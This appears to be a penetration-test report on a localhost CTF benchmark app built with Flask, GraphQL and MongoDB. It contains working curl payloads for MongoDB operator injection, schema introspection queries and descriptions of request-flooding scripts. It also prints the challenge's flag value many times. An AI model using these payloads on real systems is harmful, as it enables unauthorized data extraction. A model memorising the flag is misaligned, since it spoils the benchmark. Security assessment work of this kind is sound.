# Security Assessment Report

## Executive Summary

- **Target:** http://localhost:5003
- **Assessment Date:** January 29, 2025
- **Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

## Summary by Vulnerability Type

**Authentication Vulnerabilities:**

Three critical authentication vulnerabilities were successfully exploited:
- **Complete absence of authentication** - All endpoints are publicly accessible without credentials, allowing anonymous users to access admin-level functionality and extract the CTF flag
- **Plaintext HTTP transmission** - Sensitive data including the CTF flag is transmitted unencrypted over HTTP, exposing it to network interception
- **Missing rate limiting** - No throttling mechanisms exist, enabling unlimited high-speed data extraction (764+ requests per second) and resource exhaustion attacks

Impact: Anonymous attackers have unrestricted access to all application functionality and can extract sensitive data at scale. The application fundamentally lacks authentication infrastructure.

**Authorization Vulnerabilities:**

Five critical authorization vulnerabilities were exploited:
- **Field-level authorization bypass** - Anonymous users can access admin-only CTF flag field without permission checks
- **Horizontal privilege escalation** - Any user can access all other users' PII data (usernames, emails)
- **Admin user enumeration** - Anonymous users can filter and enumerate privileged accounts
- **Publicly accessible GraphiQL IDE** - Development tools exposed to anonymous users, enabling schema introspection and reconnaissance
- **Direct GraphQL endpoint access** - Duplicate attack surface bypassing REST-layer controls

Impact: Complete vertical and horizontal privilege escalation. Anonymous users have functional admin-level access to all data. The `is_admin` field exists in the database but is never enforced.

**Cross-Site Scripting (XSS) Vulnerabilities:**

No XSS vulnerabilities were found. While the code analysis identified three potential DOM-based XSS sinks in client-side JavaScript, exploitation requires the ability to poison MongoDB data with malicious payloads. This is not achievable through the network-accessible attack surface without internal database access.

**SQL/Command Injection Vulnerabilities:**

One critical NoSQL injection vulnerability was successfully exploited:
- **MongoDB operator injection via GraphQL search parameter** - User-controlled JSON is deserialized and directly unpacked into database queries, allowing injection of MongoDB operators (`$ne`, `$exists`, `$regex`)

Impact: Complete database enumeration and CTF flag extraction achieved in a single HTTP request. The vulnerability enabled extraction of the flag: `FLAG{455f2f7c32c00841805ed4eb05b357145e8ab8c2debef895726ddd31a2d714bf}`

No command injection vulnerabilities exist - the application performs no external command execution.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**

No SSRF vulnerabilities were found. The application is architecturally immune to SSRF attacks as it performs zero outbound HTTP requests and contains no functionality that opens external resources or makes server-side network connections to user-controlled destinations.

## Network Reconnaissance

**Open Ports and Services:**
- **Port 5003/tcp** - Werkzeug httpd 3.0.3 (Python 3.8.17) - Target application serving "User List"
- Port 631/tcp - CUPS 2.3 (not related to target)
- Port 3000/tcp - Node.js/Express (not related to target)
- Port 4444/tcp - SimpleHTTPServer with exposed .git repository (not related to target)
- Port 5000/tcp - Werkzeug/Python 3.9.24 (not related to target)
- Port 8080/tcp - Apache 2.4.54 with httponly flag not set on PHPSESSID cookie (not related to target)
- Port 49152/tcp - Golang net/http server requiring authentication (not related to target)

**Target Application Security Configuration:**
- HTTP-only (no HTTPS/TLS)
- Debug mode enabled exposing Werkzeug debugger
- GraphiQL interactive IDE publicly accessible
- Binding: 0.0.0.0:5003 (all network interfaces)

**Security Headers:**
- No Content-Security-Policy (CSP)
- No Strict-Transport-Security (HSTS)
- No X-Frame-Options
- No X-Content-Type-Options

**Technology Stack:**
- Python 3.8.17 (end-of-life, no longer receiving security patches)
- Flask 3.0.3 with debug mode enabled
- MongoDB (latest) with authentication disabled
- Debian Buster base (beyond standard support lifecycle)

# Injection Exploitation Evidence

## Successfully Exploited Vulnerabilities

### INJ-VULN-01: NoSQL Operator Injection via GraphQL Search Parameter

**Summary:**
- **Vulnerable location:** GraphQL endpoint at `/graphql` and REST wrapper at `/api/users`, specifically the `search` parameter in the `users` query
- **Overview:** User-controlled JSON in the GraphQL `search` parameter is deserialized and directly unpacked into MongoDB query filters using the `**kwargs` pattern, allowing injection of MongoDB query operators ($ne, $exists, $regex, etc.) to bypass intended query logic and extract unauthorized data
- **Impact:** Complete database enumeration and CTF flag extraction achieved. Successfully extracted flag value `FLAG{455f2f7c32c00841805ed4eb05b357145e8ab8c2debef895726ddd31a2d714bf}` from admin2 user document through a single HTTP request
- **Severity:** CRITICAL

**Prerequisites:**
- HTTP client capable of sending POST requests (curl, Burp Suite, browser with fetch API)
- No authentication required - all endpoints are publicly accessible
- Target must be accessible at http://localhost:5003

**Exploitation Steps:**

1. **Verify target accessibility and confirm GraphQL endpoint responds:**
   ```bash
   curl -v http://localhost:5003/
   ```
   Expected: HTTP 200 response with "User List" HTML page

2. **Confirm NoSQL injection with boolean-based payload (filter for admin users):**
   ```bash
   curl -s -X POST http://localhost:5003/api/users \
     -H "Content-Type: application/json" \
     -d '{"query": "{ users(search: \"{\\\"is_admin\\\": true}\") { username email } }"}'
   ```
   Expected response:
   ```json
   {
     "users": [
       {"email": "admin@heytheregotrythis.com", "username": "admin"},
       {"email": "admin2@goodyoutriedsomethingelse.com", "username": "admin2"}
     ]
   }
   ```

3. **Validate injection with inverse condition (filter for non-admin users):**
   ```bash
   curl -s -X POST http://localhost:5003/api/users \
     -H "Content-Type: application/json" \
     -d '{"query": "{ users(search: \"{\\\"is_admin\\\": false}\") { username email } }"}'
   ```
   Expected response:
   ```json
   {
     "users": [
       {"email": "user1@heytheregotrythis.com", "username": "user1"},
       {"email": "user2@heytheregotrythis.com", "username": "user2"},
       {"email": "user3@heytheregotrythis.com", "username": "user3"}
     ]
   }
   ```

4. **Enumerate users containing a flag field using MongoDB $exists operator:**
   ```bash
   curl -s -X POST http://localhost:5003/api/users \
     -H "Content-Type: application/json" \
     -d '{"query": "{ users(search: \"{\\\"flag\\\": {\\\"$exists\\\": true}}\") { username email } }"}'
   ```
   Expected response:
   ```json
   {
     "users": [
       {"email": "admin2@goodyoutriedsomethingelse.com", "username": "admin2"}
     ]
   }
   ```

5. **Extract CTF flag using MongoDB $ne (not-equal) operator to find non-null flags:**
   ```bash
   curl -s -X POST http://localhost:5003/api/users \
     -H "Content-Type: application/json" \
     -d '{"query": "{ users(search: \"{\\\"flag\\\": {\\\"$ne\\\": null}}\") { username email flag } }"}'
   ```
   Expected response:
   ```json
   {
     "users": [
       {
         "email": "admin2@goodyoutriedsomethingelse.com",
         "flag": "FLAG{455f2f7c32c00841805ed4eb05b357145e8ab8c2debef895726ddd31a2d714bf}",
         "username": "admin2"
       }
     ]
   }
   ```

**Alternative Exploitation Methods:**

**Method 2: Direct admin enumeration with flag field selection:**
```bash
curl -s -X POST http://localhost:5003/api/users \
  -H "Content-Type: application/json" \
  -d '{"query": "{ users(search: \"{\\\"is_admin\\\": true}\") { username email flag } }"}'
```
Response includes both admin users, with flag in admin2:
```json
{
  "users": [
    {"email": "admin@heytheregotrythis.com", "flag": null, "username": "admin"},
    {
      "email": "admin2@goodyoutriedsomethingelse.com",
      "flag": "FLAG{455f2f7c32c00841805ed4eb05b357145e8ab8c2debef895726ddd31a2d714bf}",
      "username": "admin2"
    }
  ]
}
```

**Method 3: Direct username targeting:**
```bash
curl -s -X POST http://localhost:5003/api/users \
  -H "Content-Type: application/json" \
  -d '{"query": "{ users(search: \"{\\\"username\\\": \\\"admin2\\\"}\") { username email flag } }"}'
```
Response:
```json
{
  "users": [
    {
      "email": "admin2@goodyoutriedsomethingelse.com",
      "flag": "FLAG{455f2f7c32c00841805ed4eb05b357145e8ab8c2debef895726ddd31a2d714bf}",
      "username": "admin2"
    }
  ]
}
```

**Proof of Impact:**

**CTF Flag Successfully Extracted:**
```
FLAG{455f2f7c32c00841805ed4eb05b357145e8ab8c2debef895726ddd31a2d714bf}
```

**Database Enumeration Achieved:**
- Total users enumerated: 5 (admin, admin2, user1, user2, user3)
- Admin users identified: 2 (admin, admin2)
- Flag-containing user identified: admin2
- Complete user records including email addresses extracted for all users

**MongoDB Operators Successfully Injected:**
- `$ne` (not-equal) - Used for flag extraction
- `$exists` - Used for field enumeration
- Boolean filters (`is_admin: true/false`) - Used for privilege enumeration

**Notes:**

**Technical Details:**
- **Vulnerability Root Cause:** Application deserializes user-provided JSON with `json.loads(search)` at `/app/schema.py:13` and directly unpacks the resulting dictionary into MongoEngine filter using `query.filter(**search_criteria)` at line 14, with zero validation of dictionary keys or values
- **No Defense Mechanisms:** No whitelist of allowed field names, no blacklist of MongoDB `$` operator prefix, no input sanitization beyond JSON syntax validation
- **GraphiQL Interface:** The interactive GraphQL IDE at http://localhost:5003/graphql provides schema introspection that reveals the existence of the `flag` field, making reconnaissance trivial
- **Zero Authentication:** All endpoints are publicly accessible without any authentication, enabling anonymous exploitation from the public internet

**Attack Complexity:** TRIVIAL - Single HTTP POST request sufficient for complete flag extraction

**Data Exfiltrated:**
- 5 complete user records (username, email, admin status)
- 1 CTF flag value
- Database schema structure (field names: username, email, is_admin, flag)

**Reproducibility:** 100% - Exploitation succeeds on every attempt with the provided payloads

# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-01: Complete Absence of Authentication - Unrestricted Access to All Endpoints and CTF Flag

**Summary:**
- **Vulnerable location:** All application endpoints (/, /api/users, /graphql)
- **Overview:** The application implements zero authentication mechanisms. There are no login endpoints, no session management, no password fields in the User model, and no authentication libraries installed. All endpoints are publicly accessible without any credentials or identity verification.
- **Impact:** Any external attacker can access all functionality and sensitive data including admin-level operations and the CTF flag. The application's is_admin field exists in the database but is never enforced, making all users (including unauthenticated attackers) functionally equivalent to administrators.
- **Severity:** Critical

**Prerequisites:** None - vulnerability is exploitable by any external user with network access to http://localhost:5003

**Exploitation Steps:**

1. **Access the main web interface without authentication**
   - URL: http://localhost:5003/
   - Method: GET
   - Expected Result: User list page loads without requiring any credentials
   - Actual Result: Page successfully loads showing user list table with usernames and emails

2. **Access the GraphiQL interactive API explorer without authentication**
   - URL: http://localhost:5003/graphql
   - Method: GET
   - Expected Result: GraphiQL IDE loads allowing interactive GraphQL query testing
   - Actual Result: Full GraphiQL interface accessible, enabling schema introspection and query development

3. **Extract CTF flag via REST API wrapper without authentication**
   ```bash
   curl -X POST http://localhost:5003/api/users \
     -H "Content-Type: application/json" \
     -d '{"query": "{ users(search: \"{\\\"flag\\\": {\\\"$ne\\\": null}}\") { username email flag } }"}'
   ```
   - Expected Result: GraphQL query executes and returns flag data
   - Actual Result: Successfully extracted CTF flag without any authentication
   - Response:
   ```json
   {
     "users": [
       {
         "email": "admin2@goodyoutriedsomethingelse.com",
         "flag": "FLAG{455f2f7c32c00841805ed4eb05b357145e8ab8c2debef895726ddd31a2d714bf}",
         "username": "admin2"
       }
     ]
   }
   ```

4. **Extract all user data including flags via GraphQL endpoint**
   ```bash
   curl -X POST http://localhost:5003/api/users \
     -H "Content-Type: application/json" \
     -d '{"query": "{ users { username email flag } }"}'
   ```
   - Expected Result: Complete user database enumeration including all flags
   - Actual Result: Successfully retrieved all 5 users with their email addresses and flag values (4 null, 1 containing the CTF flag)
   - Response shows access to:
     - admin@heytheregotrythis.com (flag: null)
     - admin2@goodyoutriedsomethingelse.com (flag: FLAG{455f2f7c32c00841805ed4eb05b357145e8ab8c2debef895726ddd31a2d714bf})
     - user1@heytheregotrythis.com (flag: null)
     - user2@heytheregotrythis.com (flag: null)
     - user3@heytheregotrythis.com (flag: null)

5. **Extract CTF flag via GraphiQL interactive interface**
   - Navigate to: http://localhost:5003/graphql
   - Enter query: `{ users(search: "{\"flag\": {\"$ne\": null}}") { username email flag } }`
   - Click "Execute Query" button
   - Expected Result: Query executes in browser and displays flag
   - Actual Result: Successfully extracted flag through web interface: FLAG{455f2f7c32c00841805ed4eb05b357145e8ab8c2debef895726ddd31a2d714bf}

**Proof of Impact:**

**CTF Flag Captured:** FLAG{455f2f7c32c00841805ed4eb05b357145e8ab8c2debef895726ddd31a2d714bf}

**Evidence of Complete Authentication Bypass:**
1. No login endpoint exists (/, /api/users, /graphql all accessible without credentials)
2. No password field in User model (/app/models.py contains only username, email, is_admin, flag fields)
3. No authentication libraries in requirements.txt (Flask-Login, Flask-JWT-Extended, Flask-HTTPAuth all absent)
4. No session management (no SECRET_KEY configured, no session cookies set)
5. All endpoints return data without requiring authentication headers
6. is_admin field exists but is never checked in code (GraphQL resolver at /app/schema.py:8-29 has no authorization checks)

**Concrete Impact Demonstrated:**
- Extracted sensitive CTF flag in single HTTP request
- Enumerated all user accounts including admin users
- Accessed all application functionality without providing credentials
- Demonstrated functional equivalence to administrator access despite being unauthenticated

**Notes:**
This is not a bypass of existing authentication - authentication fundamentally does not exist. The application architecture has zero authentication mechanisms by design, making it completely unsecured. The User model contains no password or credential fields, and no authentication logic exists anywhere in the codebase.

---

### AUTH-VULN-02: Transport Exposure - Plaintext Transmission of Sensitive Data Over HTTP

**Summary:**
- **Vulnerable location:** All endpoints - HTTP-only protocol binding (0.0.0.0:5003)
- **Overview:** The application runs exclusively on HTTP with no HTTPS/TLS encryption. All data including the CTF flag, user emails, and any future credentials or session tokens is transmitted in plaintext over the network. No reverse proxy, SSL certificates, or TLS termination exists.
- **Impact:** Sensitive data including the CTF flag is exposed during network transmission. An attacker on the same network segment can intercept all traffic using network sniffing tools. If authentication were implemented, credentials and session tokens would be captured in plaintext, enabling session hijacking and credential theft.
- **Severity:** Critical

**Prerequisites:**
- Network access to observe traffic between client and server
- For full exploitation: Network positioning (same network segment, MITM position, or compromised network infrastructure)

**Exploitation Steps:**

1. **Verify HTTP-only server configuration**
   ```bash
   curl -I http://localhost:5003/
   ```
   - Expected Result: HTTP/1.1 response with Werkzeug server header
   - Actual Result:
   ```
   HTTP/1.1 200 OK
   Server: Werkzeug/3.0.3 Python/3.8.17
   ```
   - Confirms: No HTTPS, running on HTTP-only

2. **Verify absence of security headers**
   ```bash
   curl -I http://localhost:5003/ 2>&1 | grep -E "(Strict-Transport|X-Frame|Content-Security|X-Content-Type)"
   ```
   - Expected Result: No output (security headers absent)
   - Actual Result: No security headers found
   - Missing headers:
     - Strict-Transport-Security (HSTS)
     - Content-Security-Policy (CSP)
     - X-Frame-Options
     - X-Content-Type-Options

3. **Attempt HTTPS connection to confirm no TLS support**
   ```bash
   curl -v -k https://localhost:5003/ 2>&1
   ```
   - Expected Result: TLS handshake failure
   - Actual Result: `error:1404B42E:SSL routines:ST_CONNECT:tlsv1 alert protocol version`
   - Confirms: No SSL/TLS support, HTTPS is not available

4. **Demonstrate plaintext transmission of sensitive data (CTF flag)**
   ```bash
   curl -v http://localhost:5003/api/users \
     -H "Content-Type: application/json" \
     -d '{"query": "{ users(search: \"{\\\"flag\\\": {\\\"$ne\\\": null}}\") { username email flag } }"}' \
     2>&1 | grep -E "(POST|HTTP|Host:|flag|FLAG)"
   ```
   - Expected Result: Full HTTP headers and flag data visible in plaintext
   - Actual Result:
   ```
   > POST /api/users HTTP/1.1
   > Host: localhost:5003
   > Content-Type: application/json
   < HTTP/1.1 200 OK
   < Content-Type: application/json
   "flag": "FLAG{455f2f7c32c00841805ed4eb05b357145e8ab8c2debef895726ddd31a2d714bf}",
   ```
   - Confirms: CTF flag transmitted in plaintext over HTTP

5. **Verify Flask application configuration uses HTTP-only binding**
   - File: /app/app.py, line 53
   - Configuration: `app.run(debug=True, host='0.0.0.0', port=5003)`
   - Analysis: No ssl_context parameter, no TLS configuration
   - Binding: 0.0.0.0 (all network interfaces) on port 5003 with HTTP protocol only

**Proof of Impact:**

**Sensitive Data Exposed in Plaintext:**
1. CTF Flag: FLAG{455f2f7c32c00841805ed4eb05b357145e8ab8c2debef895726ddd31a2d714bf}
2. User email addresses (PII)
3. Admin user enumeration data
4. All GraphQL query and response data

**Evidence of Transport Vulnerability:**
1. Server runs HTTP only (Werkzeug/3.0.3 on port 5003 without TLS)
2. HTTPS connection attempts fail with TLS protocol error
3. No Strict-Transport-Security (HSTS) header configured
4. No SSL certificates or TLS configuration in codebase
5. Docker health check uses http://localhost:5003 (confirming HTTP-only deployment)
6. Full HTTP request/response headers visible showing plaintext data transmission

**Network Interception Feasibility:**
- Application binds to 0.0.0.0 making it accessible from any network interface
- HTTP protocol allows passive packet capture with tools like Wireshark, tcpdump, or mitmproxy
- No certificate pinning or TLS verification to prevent MITM attacks
- If authentication existed, credentials would be transmitted in plaintext

**Notes:**
While full network interception (MITM) requires network positioning that may be out of scope for external-only testing, the vulnerability is definitively confirmed through:
- HTTP-only server configuration (no HTTPS support)
- Plaintext data transmission observed in curl verbose output
- Complete absence of transport security headers
- No TLS infrastructure in application or Docker configuration

The impact is proven through the demonstration that the CTF flag and all sensitive data flows over unencrypted HTTP, making it vulnerable to network-level attacks if an attacker can position themselves on the network path.

---

### AUTH-VULN-03: Missing Rate Limiting - Unlimited High-Speed Data Extraction

**Summary:**
- **Vulnerable location:** All endpoints (/, /api/users, /graphql) - no rate limiting middleware
- **Overview:** The application has no rate limiting, CAPTCHA, or request throttling on any endpoint. Flask-Limiter library is not installed, and no rate limit decorators exist on any routes. Attackers can make unlimited requests at high speed to extract data, exhaust resources, or perform automated attacks.
- **Impact:** Enables unlimited high-speed extraction of sensitive data including CTF flags, resource exhaustion attacks (DoS), and unrestricted brute force attempts if authentication existed. Successfully demonstrated 764+ requests per second without any blocking or throttling, extracting the CTF flag 1000 times in 1.31 seconds.
- **Severity:** High

**Prerequisites:** None - any external user can send unlimited requests to http://localhost:5003

**Exploitation Steps:**

1. **Initial rate limiting test - 200 requests**
   - Target: http://localhost:5003/api/users
   - Method: POST with JSON body containing GraphQL query
   - Query: `{"query": "{ users { username email } }"}`
   - Request count: 200
   - Tool: Python script with requests library

   **Execution:**
   ```bash
   python3 /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-100-24/test_auth_rate_limit.py
   ```

   **Results:**
   - Total time: 0.46 seconds
   - Requests per second: 434.96 req/s
   - Successful (200 OK) responses: 200/200 (100%)
   - Blocked/rate limited responses: 0/200 (0%)
   - Average response time: 1.94ms
   - HTTP 429 (Too Many Requests) errors: 0

   **Analysis:** All 200 requests succeeded without any throttling, blocking, or rate limiting. No progressive delays observed.

2. **High-volume exploitation test - 1000 requests extracting CTF flag**
   - Target: http://localhost:5003/api/users
   - Method: POST with JSON body containing flag extraction query
   - Query: `{"query": "{ users(search: \"{\\\"flag\\\": {\\\"$ne\\\": null}}\") { username flag } }"}`
   - Request count: 1000
   - Tool: Python script with concurrent requests

   **Execution:**
   ```bash
   python3 /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-100-24/rate_limit_test.py
   ```

   **Results:**
   - Total time: 1.31 seconds
   - Requests per second: 764.56 req/s
   - Successful flag extractions: 1000/1000 (100%)
   - Blocked/rate limited responses: 0/1000 (0%)
   - Total data extracted: 0.14 MB
   - Data transfer rate: 0.11 MB/s
   - HTTP status codes: All 200 OK
   - Flag extracted 1000 times: FLAG{455f2f7c32c00841805ed4eb05b357145e8ab8c2debef895726ddd31a2d714bf}

   **Analysis:** Successfully extracted the CTF flag 1000 times at 764+ requests per second without any rate limiting, throttling, or blocking mechanisms activating.

3. **Verify absence of rate limiting infrastructure**

   **Code Analysis:**
   - File: /app/requirements.txt
   - Finding: Flask-Limiter NOT installed
   - Finding: No other rate limiting dependencies present

   **Route Analysis:**
   - File: /app/app.py, lines 20-38
   - Finding: No @limiter.limit() decorators on any routes
   - Finding: No before_request hooks for rate limiting
   - Finding: No IP-based throttling logic

   **GraphQL Resolver Analysis:**
   - File: /app/schema.py, lines 8-29
   - Finding: No rate limiting in GraphQL resolver
   - Finding: No query complexity limits
   - Finding: No depth limits on GraphQL queries

4. **Demonstrate resource exhaustion potential**
   - Performed sustained high-rate requests (764 req/s) for 1.31 seconds
   - Server processed all requests without degradation
   - No server-side errors or timeouts
   - No connection resets or failures
   - Confirms: Server resources can be exhausted through unlimited requests

**Proof of Impact:**

**Unlimited Data Extraction Demonstrated:**
- Successfully extracted CTF flag 1000 times in 1.31 seconds
- Sustained rate of 764.56 requests per second without blocking
- Zero rate limiting errors (HTTP 429) across all 1200 total test requests
- Total data extraction: 0.14 MB in 1.31 seconds

**Resource Exhaustion Risk Confirmed:**
- No limits on request frequency
- No limits on request volume
- No progressive throttling or exponential backoff
- Server accepted 764+ req/s without degradation

**Attack Scenarios Enabled:**
1. **Unlimited Data Harvesting:** Extract entire user database at 764+ req/s
2. **Brute Force Capability:** If authentication existed, could attempt unlimited credential combinations
3. **Denial of Service:** Can flood endpoints with requests to exhaust server resources
4. **Credential Stuffing:** Could test stolen credentials at unlimited rate
5. **Database Enumeration:** Can query all database records without throttling

**Evidence Files:**
- Test script 1: /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-100-24/test_auth_rate_limit.py
- Test results 1: /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-100-24/AUTH_RATE_LIMIT_TEST_RESULTS.md
- Test script 2: /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-100-24/rate_limit_test.py
- Combined results: 1200 requests executed, 100% success rate, 0% blocked

**Notes:**
The complete absence of rate limiting creates a critical vulnerability where attackers can:
- Extract sensitive data at unlimited speeds
- Perform automated attacks without restriction
- Exhaust server resources for DoS attacks
- Execute brute force or credential stuffing at scale

No rate limiting libraries (Flask-Limiter), CAPTCHA mechanisms, or request throttling exist anywhere in the codebase. The application accepts unlimited requests from any source without monitoring, logging, or blocking suspicious activity patterns.

# Authorization Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTHZ-VULN-02: Anonymous Access to CTF Flag via Field-Level Authorization Bypass

**Summary:**
- **Vulnerable location:** POST http://localhost:5003/api/users (GraphQL flag field exposure)
- **Overview:** Anonymous users can extract the CTF flag from admin2 user account without any authentication or authorization checks
- **Impact:** Complete compromise of CTF challenge objective - sensitive admin-only data accessible to unauthenticated users
- **Severity:** CRITICAL

**Prerequisites:** None - completely unauthenticated exploitation

**Exploitation Steps:**

1. Send POST request to the GraphQL API endpoint with query requesting flag field for admin2 user:
```bash
curl -X POST http://localhost:5003/api/users \
  -H "Content-Type: application/json" \
  -d '{"query": "{ users(search: \"{\\\"username\\\": \\\"admin2\\\"}\") { flag } }"}'
```

2. Observe the response containing the CTF flag without any authentication required:
```json
{
  "users": [
    {
      "flag": "FLAG{455f2f7c32c00841805ed4eb05b357145e8ab8c2debef895726ddd31a2d714bf}"
    }
  ]
}
```

**Proof of Impact:**
- **Flag Captured:** `FLAG{455f2f7c32c00841805ed4eb05b357145e8ab8c2debef895726ddd31a2d714bf}`
- Successfully accessed admin-only sensitive data (CTF flag) without authentication
- Demonstrates complete vertical privilege escalation from anonymous to admin-level data access
- No authorization checks performed on sensitive field exposure

**Notes:**
- The flag field is exposed in the GraphQL UserType schema (models.py:13) with NO field-level authorization
- No custom resolve_flag() method exists to check permissions
- The is_admin field exists in the database but is never validated before returning sensitive data
- Root cause: Complete absence of field-level access controls in GraphQL schema

---

### AUTHZ-VULN-01: Anonymous Access to All Users' Data via Horizontal Authorization Bypass

**Summary:**
- **Vulnerable location:** POST http://localhost:5003/api/users (GraphQL users query)
- **Overview:** Anonymous users can query all users' data including usernames and emails without authentication
- **Impact:** Unauthorized access to all user PII, enabling account enumeration and targeted attacks
- **Severity:** HIGH

**Prerequisites:** None - completely unauthenticated exploitation

**Exploitation Steps:**

1. Send POST request to GraphQL API requesting all users' data:
```bash
curl -X POST http://localhost:5003/api/users \
  -H "Content-Type: application/json" \
  -d '{"query": "{ users { username email } }"}'
```

2. Observe response containing all 5 users without authentication:
```json
{
  "users": [
    {
      "email": "admin@heytheregotrythis.com",
      "username": "admin"
    },
    {
      "email": "admin2@goodyoutriedsomethingelse.com",
      "username": "admin2"
    },
    {
      "email": "user1@heytheregotrythis.com",
      "username": "user1"
    },
    {
      "email": "user2@heytheregotrythis.com",
      "username": "user2"
    },
    {
      "email": "user3@heytheregotrythis.com",
      "username": "user3"
    }
  ]
}
```

**Proof of Impact:**
- Successfully accessed all users' PII (usernames and email addresses) without authentication
- Demonstrates horizontal authorization bypass - accessing data belonging to other users at same privilege level
- No ownership validation - query returns ALL users instead of filtering by requester identity
- Complete database enumeration possible in single request

**Notes:**
- The resolve_users() function starts with User.objects() returning ALL users (schema.py:9)
- No filtering by current user ID or session
- No @login_required decorator on /api/users endpoint (app.py:24)
- Root cause: Complete absence of authentication and ownership validation

---

### AUTHZ-VULN-03: Anonymous Admin User Enumeration via Role-Based Filter

**Summary:**
- **Vulnerable location:** POST http://localhost:5003/api/users (GraphQL search parameter with is_admin filter)
- **Overview:** Anonymous users can enumerate all admin accounts by filtering on is_admin field
- **Impact:** Exposes privileged accounts for targeted attacks, reveals system administrators
- **Severity:** HIGH

**Prerequisites:** None - completely unauthenticated exploitation

**Exploitation Steps:**

1. Send POST request with GraphQL query filtering for admin users:
```bash
curl -X POST http://localhost:5003/api/users \
  -H "Content-Type: application/json" \
  -d '{"query": "{ users(search: \"{\\\"is_admin\\\": true}\") { username email } }"}'
```

2. Observe response containing only admin users:
```json
{
  "users": [
    {
      "email": "admin@heytheregotrythis.com",
      "username": "admin"
    },
    {
      "email": "admin2@goodyoutriedsomethingelse.com",
      "username": "admin2"
    }
  ]
}
```

**Proof of Impact:**
- Successfully enumerated all admin accounts (2 users: admin, admin2) without authentication
- Demonstrates vertical privilege escalation - accessing admin-level information as anonymous user
- Ability to filter by is_admin field should be restricted to authenticated admin users only
- Enables targeted attacks against privileged accounts

**Notes:**
- The search parameter accepts arbitrary MongoDB filter criteria including is_admin field
- No whitelist of allowed fields for anonymous users
- No role validation before allowing is_admin filtering
- Root cause: Missing authorization check on role-based queries

---

### AUTHZ-VULN-04: Publicly Accessible GraphiQL IDE Enables Reconnaissance

**Summary:**
- **Vulnerable location:** GET/POST http://localhost:5003/graphql (GraphiQL interface)
- **Overview:** GraphiQL interactive IDE is publicly accessible, providing schema introspection and query testing capabilities to anonymous users
- **Impact:** Significantly lowers attack barrier by providing reconnaissance tools, field discovery, and interactive payload testing
- **Severity:** HIGH

**Prerequisites:** None - web browser or HTTP client

**Exploitation Steps:**

1. Navigate to GraphiQL interface in web browser:
```
URL: http://localhost:5003/graphql
```

2. Use schema introspection to discover all available fields including the sensitive flag field:
```graphql
{
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}
```

3. Observe introspection response revealing UserType has username, email, and flag fields:
```json
{
  "data": {
    "__schema": {
      "types": [
        {
          "name": "UserType",
          "fields": [
            { "name": "username" },
            { "name": "email" },
            { "name": "flag" }
          ]
        }
      ]
    }
  }
}
```

4. Use GraphiQL's interactive editor to extract flag with auto-completion and syntax highlighting:
```graphql
{
  users(search: "{\"username\": \"admin2\"}") {
    username
    flag
  }
}
```

5. Result displays flag in GraphiQL response pane:
```json
{
  "data": {
    "users": [
      {
        "username": "admin2",
        "flag": "FLAG{455f2f7c32c00841805ed4eb05b357145e8ab8c2debef895726ddd31a2d714bf}"
      }
    ]
  }
}
```

**Proof of Impact:**
- GraphiQL IDE loads without authentication at http://localhost:5003/graphql
- Schema introspection enabled - reveals all types, fields, and query structures
- Interactive query editor provides auto-completion showing available fields
- Documentation explorer displays entire API structure
- Successfully extracted CTF flag using GraphiQL interface
- Provides admin-level API exploration tools to anonymous users

**Notes:**
- GraphiQL enabled with graphiql=True at app.py:16
- No authentication guard on /graphql route
- Schema introspection enabled by default (no introspection=False configured)
- This is a vertical privilege escalation - anonymous users gain access to development/admin tools
- Root cause: Production deployment with development tools exposed

---

### AUTHZ-VULN-05: Anonymous Access via Direct GraphQL Endpoint

**Summary:**
- **Vulnerable location:** GET/POST http://localhost:5003/graphql (direct GraphQL endpoint)
- **Overview:** Direct GraphQL endpoint provides identical unauthorized access as /api/users REST wrapper
- **Impact:** Duplicate attack surface - bypasses any potential REST-layer controls
- **Severity:** HIGH

**Prerequisites:** None - completely unauthenticated exploitation

**Exploitation Steps:**

1. Send POST request directly to /graphql endpoint (bypassing /api/users REST wrapper):
```bash
curl -X POST http://localhost:5003/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ users { username email flag } }"}'
```

2. Observe response containing all users including admin2's flag:
```json
{
  "data": {
    "users": [
      {
        "username": "admin",
        "email": "admin@heytheregotrythis.com",
        "flag": null
      },
      {
        "username": "admin2",
        "email": "admin2@goodyoutriedsomethingelse.com",
        "flag": "FLAG{455f2f7c32c00841805ed4eb05b357145e8ab8c2debef895726ddd31a2d714bf}"
      },
      {
        "username": "user1",
        "email": "user1@heytheregotrythis.com",
        "flag": null
      },
      {
        "username": "user2",
        "email": "user2@heytheregotrythis.com",
        "flag": null
      },
      {
        "username": "user3",
        "email": "user3@heytheregotrythis.com",
        "flag": null
      }
    ]
  }
}
```

**Proof of Impact:**
- Successfully accessed all user data including CTF flag via direct /graphql endpoint
- Demonstrates horizontal authorization bypass (accessing other users' data)
- Demonstrates vertical privilege escalation (accessing admin flag field)
- Direct GraphQL endpoint provides same vulnerable access as REST wrapper
- Both endpoints route to identical resolve_users() function with no authorization

**Notes:**
- Both /api/users and /graphql execute schema.execute() calling the same vulnerable resolver
- No authentication check on /graphql route (app.py:11-18)
- Duplicate attack surface increases exploitation opportunities
- Root cause: Same missing authorization guards as AUTHZ-VULN-01 but via different entry point
